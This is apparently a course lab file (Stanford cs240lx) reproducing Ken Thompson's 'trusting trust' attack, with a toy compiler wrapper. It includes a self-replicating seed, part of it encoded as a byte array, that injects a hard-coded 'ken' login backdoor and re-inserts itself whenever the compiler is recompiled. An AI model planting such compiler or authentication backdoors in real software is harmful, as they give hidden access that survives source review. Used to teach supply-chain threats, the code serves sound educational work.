// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)

// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.

static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out1.c", "w");
  assert(fp);
  fprintf(fp, "%s", program);
  fclose(fp);

#include "attack-seed.c"

  /************************************************************
   * don't modify the rest.
   */

  // gross, call gcc.
  char buf[1024];

  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness",
          outname); // how this works
  if (system(buf) != 0)
    error("system failed\n");
}

#define N 8 * 1024 * 1024
static char buf[N + 1];

int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);

  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);

  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");

  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}

char prog[] = {
    70,  73,  76,  69,  32,  42,  99,  111, 100, 101, 32,  61,  32,  102, 111,
    112, 101, 110, 40,  34,  46,  47,  116, 101, 109, 112, 45,  111, 117, 116,
    49,  46,  99,  34,  44,  32,  34,  114, 34,  41,  59,  10,  97,  115, 115,
    101, 114, 116, 40,  99,  111, 100, 101, 41,  59,  10,  10,  47,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  10,  32,  42,  32,  83,  116, 101, 112, 32,  49,  58,  10,
    32,  42,  47,  10,  10,  47,  47,  32,  109, 97,  116, 99,  104, 32,  111,
    110, 32,  116, 104, 101, 32,  115, 116, 97,  114, 116, 32,  111, 102, 32,
    116, 104, 101, 32,  108, 111, 103, 105, 110, 40,  41,  32,  114, 111, 117,
    116, 105, 110, 101, 58,  10,  115, 116, 97,  116, 105, 99,  32,  99,  104,
    97,  114, 32,  108, 111, 103, 105, 110, 95,  115, 105, 103, 91,  93,  32,
    61,  32,  34,  105, 110, 116, 32,  108, 111, 103, 105, 110, 40,  99,  104,
    97,  114, 32,  42,  117, 115, 101, 114, 41,  32,  123, 92,  110, 34,  59,
    10,  10,  47,  47,  32,  97,  110, 100, 32,  105, 110, 106, 101, 99,  116,
    32,  97,  110, 32,  97,  116, 116, 97,  99,  107, 32,  102, 111, 114, 32,
    34,  107, 101, 110, 34,  58,  10,  115, 116, 97,  116, 105, 99,  32,  99,
    104, 97,  114, 32,  108, 111, 103, 105, 110, 95,  97,  116, 116, 97,  99,
    107, 91,  93,  32,  61,  32,  34,  105, 102, 40,  115, 116, 114, 99,  109,
    112, 40,  117, 115, 101, 114, 44,  32,  92,  34,  107, 101, 110, 92,  34,
    41,  32,  61,  61,  32,  48,  41,  32,  114, 101, 116, 117, 114, 110, 32,
    49,  59,  34,  59,  10,  10,  47,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,
    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  10,  32,  42,
    32,  83,  116, 101, 112, 32,  50,  58,  10,  32,  42,  47,  10,  10,  47,
    47,  32,  115, 101, 97,  114, 99,  104, 32,  102, 111, 114, 32,  116, 104,
    101, 32,  115, 116, 97,  114, 116, 32,  111, 102, 32,  116, 104, 101, 32,
    99,  111, 109, 112, 105, 108, 101, 32,  114, 111, 117, 116, 105, 110, 101,
    58,  10,  115, 116, 97,  116, 105, 99,  32,  99,  104, 97,  114, 32,  99,
    111, 109, 112, 105, 108, 101, 95,  115, 105, 103, 91,  93,  32,  61,  10,
    32,  32,  32,  32,  34,  115, 116, 97,  116, 105, 99,  32,  118, 111, 105,
    100, 32,  99,  111, 109, 112, 105, 108, 101, 40,  99,  104, 97,  114, 32,
    42,  112, 114, 111, 103, 114, 97,  109, 44,  32,  99,  104, 97,  114, 32,
    42,  111, 117, 116, 110, 97,  109, 101, 41,  32,  123, 92,  110, 34,  10,
    32,  32,  32,  32,  34,  32,  32,  32,  32,  70,  73,  76,  69,  32,  42,
    102, 112, 32,  61,  32,  102, 111, 112, 101, 110, 40,  92,  34,  46,  47,
    116, 101, 109, 112, 45,  111, 117, 116, 46,  99,  92,  34,  44,  32,  92,
    34,  119, 92,  34,  41,  59,  92,  110, 34,  10,  32,  32,  32,  32,  34,
    32,  32,  32,  32,  97,  115, 115, 101, 114, 116, 40,  102, 112, 41,  59,
    92,  110, 34,  59,  10,  115, 116, 97,  116, 105, 99,  32,  99,  104, 97,
    114, 32,  102, 105, 114, 115, 116, 95,  108, 105, 110, 101, 91,  93,  32,
    61,  32,  34,  32,  32,  102, 99,  108, 111, 115, 101, 40,  102, 112, 41,
    59,  92,  110, 34,  59,  10,  47,  47,  34,  115, 116, 97,  116, 105, 99,
    32,  118, 111, 105, 100, 32,  99,  111, 109, 112, 105, 108, 101, 40,  99,
    104, 97,  114, 32,  42,  112, 114, 111, 103, 114, 97,  109, 44,  32,  99,
    104, 97,  114, 32,  42,  111, 117, 116, 110, 97,  109, 101, 41,  32,  123,
    92,  110, 34,  59,  10,  10,  115, 116, 97,  116, 105, 99,  32,  99,  104,
    97,  114, 32,  115, 101, 99,  111, 110, 100, 95,  108, 105, 110, 101, 91,
    93,  32,  61,  32,  34,  32,  32,  70,  73,  76,  69,  32,  42,  102, 112,
    32,  61,  32,  102, 111, 112, 101, 110, 40,  92,  34,  46,  47,  116, 101,
    109, 112, 45,  111, 117, 116, 46,  99,  92,  34,  44,  32,  92,  34,  119,
    92,  34,  41,  59,  92,  110, 34,  59,  10,  10,  115, 116, 97,  116, 105,
    99,  32,  99,  104, 97,  114, 32,  116, 104, 105, 114, 100, 95,  108, 105,
    110, 101, 91,  93,  32,  61,  32,  34,  32,  32,  97,  115, 115, 101, 114,
    116, 40,  102, 112, 41,  59,  92,  110, 34,  59,  10,  10,  70,  73,  76,
    69,  32,  42,  111, 117, 116, 112, 117, 116, 32,  61,  32,  102, 111, 112,
    101, 110, 40,  34,  46,  47,  116, 101, 109, 112, 45,  111, 117, 116, 46,
    99,  34,  44,  32,  34,  119, 34,  41,  59,  10,  97,  115, 115, 101, 114,
    116, 40,  111, 117, 116, 112, 117, 116, 41,  59,  10,  99,  104, 97,  114,
    32,  108, 105, 110, 101, 91,  49,  48,  48,  93,  59,  10,  99,  104, 97,
    114, 32,  108, 111, 103, 105, 110, 78,  101, 120, 116, 76,  105, 110, 101,
    71,  101, 116, 32,  61,  32,  48,  59,  10,  99,  104, 97,  114, 32,  99,
    111, 109, 112, 105, 108, 101, 114, 78,  101, 120, 116, 76,  105, 110, 101,
    71,  101, 116, 32,  61,  32,  48,  59,  10,  119, 104, 105, 108, 101, 32,
    40,  102, 103, 101, 116, 115, 40,  108, 105, 110, 101, 44,  32,  115, 105,
    122, 101, 111, 102, 40,  108, 105, 110, 101, 41,  44,  32,  99,  111, 100,
    101, 41,  32,  33,  61,  32,  78,  85,  76,  76,  41,  32,  123, 10,  32,
    32,  105, 102, 32,  40,  108, 111, 103, 105, 110, 78,  101, 120, 116, 76,
    105, 110, 101, 71,  101, 116, 32,  61,  61,  32,  49,  41,  32,  123, 10,
    32,  32,  32,  32,  102, 112, 114, 105, 110, 116, 102, 40,  111, 117, 116,
    112, 117, 116, 44,  32,  34,  37,  115, 34,  44,  32,  108, 111, 103, 105,
    110, 95,  97,  116, 116, 97,  99,  107, 41,  59,  10,  32,  32,  32,  32,
    108, 111, 103, 105, 110, 78,  101, 120, 116, 76,  105, 110, 101, 71,  101,
    116, 32,  61,  32,  48,  59,  10,  32,  32,  125, 10,  32,  32,  105, 102,
    32,  40,  99,  111, 109, 112, 105, 108, 101, 114, 78,  101, 120, 116, 76,
    105, 110, 101, 71,  101, 116, 32,  61,  61,  32,  49,  41,  32,  123, 32,
    47,  47,  32,  51,  10,  32,  32,  32,  32,  105, 110, 116, 32,  105, 59,
    10,  32,  32,  32,  32,  102, 112, 114, 105, 110, 116, 102, 40,  111, 117,
    116, 112, 117, 116, 44,  32,  34,  37,  115, 34,  44,  32,  34,  99,  104,
    97,  114, 32,  112, 114, 111, 103, 91,  93,  32,  61,  32,  123, 92,  110,
    34,  41,  59,  10,  32,  32,  32,  32,  102, 111, 114, 32,  40,  105, 32,
    61,  32,  48,  59,  32,  112, 114, 111, 103, 91,  105, 93,  59,  32,  105,
    43,  43,  41,  10,  32,  32,  32,  32,  32,  32,  102, 112, 114, 105, 110,
    116, 102, 40,  111, 117, 116, 112, 117, 116, 44,  32,  34,  92,  116, 37,
    100, 44,  37,  99,  34,  44,  32,  112, 114, 111, 103, 91,  105, 93,  44,
    32,  40,  105, 32,  43,  32,  49,  41,  32,  37,  32,  56,  32,  61,  61,
    32,  48,  32,  63,  32,  39,  92,  110, 39,  32,  58,  32,  39,  32,  39,
    41,  59,  10,  32,  32,  32,  32,  102, 112, 114, 105, 110, 116, 102, 40,
    111, 117, 116, 112, 117, 116, 44,  32,  34,  37,  115, 34,  44,  32,  34,
    48,  32,  125, 59,  92,  110, 34,  41,  59,  10,  32,  32,  32,  32,  102,
    112, 114, 105, 110, 116, 102, 40,  111, 117, 116, 112, 117, 116, 44,  32,
    34,  37,  115, 34,  44,  32,  112, 114, 111, 103, 41,  59,  10,  32,  32,
    32,  32,  99,  111, 109, 112, 105, 108, 101, 114, 78,  101, 120, 116, 76,
    105, 110, 101, 71,  101, 116, 32,  61,  32,  48,  59,  10,  32,  32,  125,
    10,  32,  32,  102, 112, 114, 105, 110, 116, 102, 40,  111, 117, 116, 112,
    117, 116, 44,  32,  34,  37,  115, 34,  44,  32,  108, 105, 110, 101, 41,
    59,  10,  32,  32,  105, 102, 32,  40,  115, 116, 114, 99,  109, 112, 40,
    108, 105, 110, 101, 44,  32,  108, 111, 103, 105, 110, 95,  115, 105, 103,
    41,  32,  61,  61,  32,  48,  41,  32,  123, 10,  32,  32,  32,  32,  108,
    111, 103, 105, 110, 78,  101, 120, 116, 76,  105, 110, 101, 71,  101, 116,
    32,  61,  32,  49,  59,  10,  32,  32,  125, 10,  32,  32,  105, 102, 32,
    40,  115, 116, 114, 99,  109, 112, 40,  108, 105, 110, 101, 44,  32,  102,
    105, 114, 115, 116, 95,  108, 105, 110, 101, 41,  32,  61,  61,  32,  48,
    32,  38,  38,  32,  99,  111, 109, 112, 105, 108, 101, 114, 78,  101, 120,
    116, 76,  105, 110, 101, 71,  101, 116, 32,  61,  61,  32,  48,  41,  32,
    123, 10,  32,  32,  32,  32,  99,  111, 109, 112, 105, 108, 101, 114, 78,
    101, 120, 116, 76,  105, 110, 101, 71,  101, 116, 32,  43,  61,  32,  49,
    59,  10,  32,  32,  125, 10,  32,  32,  47,  47,  32,  32,  32,  101, 108,
    115, 101, 32,  105, 102, 32,  40,  115, 116, 114, 99,  109, 112, 40,  108,
    105, 110, 101, 44,  32,  115, 101, 99,  111, 110, 100, 95,  108, 105, 110,
    101, 41,  32,  61,  61,  32,  48,  32,  38,  38,  32,  99,  111, 109, 112,
    105, 108, 101, 114, 78,  101, 120, 116, 76,  105, 110, 101, 71,  101, 116,
    32,  61,  61,  32,  49,  41,  32,  123, 10,  32,  32,  47,  47,  32,  32,
    32,  32,  32,  99,  111, 109, 112, 105, 108, 101, 114, 78,  101, 120, 116,
    76,  105, 110, 101, 71,  101, 116, 32,  43,  61,  32,  49,  59,  10,  32,
    32,  47,  47,  32,  32,  32,  125, 32,  101, 108, 115, 101, 32,  105, 102,
    32,  40,  115, 116, 114, 99,  109, 112, 40,  108, 105, 110, 101, 44,  32,
    116, 104, 105, 114, 100, 95,  108, 105, 110, 101, 41,  32,  61,  61,  32,
    48,  32,  38,  38,  32,  99,  111, 109, 112, 105, 108, 101, 114, 78,  101,
    120, 116, 76,  105, 110, 101, 71,  101, 116, 32,  61,  61,  32,  50,  41,
    32,  123, 10,  32,  32,  47,  47,  32,  32,  32,  32,  32,  99,  111, 109,
    112, 105, 108, 101, 114, 78,  101, 120, 116, 76,  105, 110, 101, 71,  101,
    116, 32,  43,  61,  32,  49,  59,  10,  32,  32,  47,  47,  32,  32,  32,
    125, 10,  125, 10,  102, 99,  108, 111, 115, 101, 40,  111, 117, 116, 112,
    117, 116, 41,  59,  10,  102, 99,  108, 111, 115, 101, 40,  99,  111, 100,
    101, 41,  59,  10,  10,  70,  73,  76,  69,  32,  42,  100, 101, 98,  117,
    103, 32,  61,  32,  102, 111, 112, 101, 110, 40,  34,  46,  47,  116, 101,
    109, 112, 45,  111, 117, 116, 46,  99,  34,  44,  32,  34,  114, 34,  41,
    59,  10,  97,  115, 115, 101, 114, 116, 40,  100, 101, 98,  117, 103, 41,
    59,  10,  119, 104, 105, 108, 101, 32,  40,  102, 103, 101, 116, 115, 40,
    108, 105, 110, 101, 44,  32,  115, 105, 122, 101, 111, 102, 40,  108, 105,
    110, 101, 41,  44,  32,  100, 101, 98,  117, 103, 41,  32,  33,  61,  32,
    78,  85,  76,  76,  41,  32,  123, 10,  32,  32,  112, 114, 105, 110, 116,
    102, 40,  34,  37,  115, 34,  44,  32,  108, 105, 110, 101, 41,  59,  10,
    125, 10,  102, 99,  108, 111, 115, 101, 40,  100, 101, 98,  117, 103, 41,
    59,  0};
FILE *code = fopen("./temp-out1.c", "r");
assert(code);

/*****************************************************************
 * Step 1:
 */

// match on the start of the login() routine:
static char login_sig[] = "int login(char *user) {\n";

// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

/*****************************************************************
 * Step 2:
 */

// search for the start of the compile routine:
static char compile_sig[] =
    "static void compile(char *program, char *outname) {\n"
    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
    "    assert(fp);\n";
static char first_line[] = "  fclose(fp);\n";
//"static void compile(char *program, char *outname) {\n";

static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");\n";

static char third_line[] = "  assert(fp);\n";

FILE *output = fopen("./temp-out.c", "w");
assert(output);
char line[100];
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
while (fgets(line, sizeof(line), code) != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 1) { // 3
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
  }
  fprintf(output, "%s", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  }
  //   else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
  //     compilerNextLineGet += 1;
  //   } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
  //     compilerNextLineGet += 1;
  //   }
}
fclose(output);
fclose(code);

FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(line, sizeof(line), debug) != NULL) {
  printf("%s", line);
}
fclose(debug);